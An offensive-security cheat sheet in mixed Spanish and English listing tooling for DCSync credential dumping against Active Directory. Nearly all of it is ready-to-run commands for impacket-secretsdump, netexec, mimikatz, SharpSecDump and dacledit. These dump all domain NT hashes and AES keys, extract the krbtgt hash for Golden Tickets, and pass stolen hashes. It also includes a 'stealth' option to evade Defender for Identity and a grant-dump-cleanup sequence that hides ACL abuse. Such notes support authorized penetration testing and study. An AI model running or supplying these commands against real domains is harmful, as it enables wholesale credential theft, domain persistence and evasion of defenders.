---
aliases:
  - "DCSync Attack - Secretsdump"
  - DCSync Tools
  - secretsdump dcsync
  - mimikatz dcsync
tags:
  - technique/credential-access
  - env/windows
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[DCSync]]"
---

# DCSync - Tooling

---

## impacket-secretsdump

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-secretsdump corp/admin:pass@DC -just-dc-ntlm` | Full NT hashes via DCSync | Standard. |
| `impacket-secretsdump corp/admin:pass@DC -just-dc` | NT + AES keys | Kerberos keys needed. |
| `impacket-secretsdump corp/admin:pass@DC -just-dc-user krbtgt` | Solo krbtgt | Golden Ticket. |
| `impacket-secretsdump corp/admin:pass@DC -just-dc-user administrator` | Solo admin | PtH directo. |
| `impacket-secretsdump -hashes :NT corp/admin@DC -just-dc-ntlm` | Full dump via PtH | Sin password. |
| `impacket-secretsdump -k -no-pass corp/admin@DC.corp.local -just-dc-ntlm` | Full dump via Kerberos ticket | Con KRB5CCNAME set. |
| `impacket-secretsdump corp/admin:pass@DC -outputfile dump` | Guarda en `dump.ntds` | Pipeline / save. |
^dcsync-tool-secretsdump

```bash
# Install
pip install impacket  # o: sudo apt install python3-impacket

# Uso mínimo post-DA
impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-ntlm

# Solo krbtgt
impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-user krbtgt
```

---

## nxc / netexec

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb DC -u admin -p pass --ntds` | Full NT hashes | Preferred — output limpio. |
| `nxc smb DC -u admin -H NT --ntds` | Full dump via PtH | Sin password. |
| `nxc smb DC -u admin -p pass --ntds drsuapi` | Forzar DCSync method | Explícito. |
| `nxc smb DC -u admin -p pass --ntds vss` | Forzar VSS method (evade MDI DCSync) | Alternativa stealth. |
| `nxc smb DC -u admin -p pass --ntds --enabled` | Solo enabled accounts | Output limpio. |
^dcsync-tool-nxc

```bash
nxc smb dc01.corp.local -u administrator -p 'P@ssw0rd' --ntds --enabled
# Output en ~/.nxc/logs/
```

---

## mimikatz lsadump

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `lsadump::dcsync /domain:corp.local /user:krbtgt` | krbtgt hash + AES | Golden Ticket prep. |
| `lsadump::dcsync /domain:corp.local /user:administrator` | Admin hash | PtH/PtT. |
| `lsadump::dcsync /domain:corp.local /all /csv` | Full dump CSV | Masivo. |
| `lsadump::dcsync /domain:corp.local /all /csv /dc:dc01` | DC específico | Multi-DC. |
^dcsync-tool-mimi

```
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

---

## SharpSecDump (.NET)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `SharpSecDump.exe -target=DC -u=admin -p=pass -d=corp.local` | Full dump desde Windows | C# — sin impacket. |
| `SharpSecDump.exe -target=DC -u=admin -p=pass -d=corp.local -just-dc-ntlm` | Solo NT hashes | Compacto. |
^dcsync-tool-sharpsec

```powershell
.\SharpSecDump.exe -target=dc01.corp.local -u=administrator -p='P@ssw0rd' -d=corp.local
```

---

## dacledit (grant/remove DCSync)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `dacledit.py -action write -rights DCSync -principal user corp/admin:pass@DC` | Agrega ACEs DCSync | ACL abuse — WriteDACL prereq. |
| `dacledit.py -action read -target "DC=corp,DC=local" corp/admin:pass@DC` | Lee DACL domain root | Verify pre/post. |
| `dacledit.py -action remove -rights DCSync -principal user corp/admin:pass@DC` | Remueve ACEs | Cleanup. |
^dcsync-tool-dacledit

```bash
# Grant + use + cleanup
dacledit.py -action write -rights DCSync -principal attacker corp.local/administrator:'P@ssw0rd'@dc01.corp.local
impacket-secretsdump corp.local/attacker:'P@ssw0rd'@dc01.corp.local -just-dc-ntlm
dacledit.py -action remove -rights DCSync -principal attacker corp.local/administrator:'P@ssw0rd'@dc01.corp.local
```

---

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| impacket | `https://github.com/fortra/impacket` |
| netexec | `https://github.com/Pennyw0rth/NetExec` |
| SharpSecDump | `https://github.com/G0ldenGunSec/SharpSecDump` |
| dacledit (impacket examples) | `https://github.com/fortra/impacket/blob/master/examples/dacledit.py` |
| HackTricks — DCSync | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync` |
| The Hacker Recipes — DCSync | `https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync` |
| ADSecurity — DCSync detection | `https://adsecurity.org/?p=1729` |
| MITRE ATT&CK T1003.006 | `https://attack.mitre.org/techniques/T1003/006/` |
^dcsync-tool-resources

---
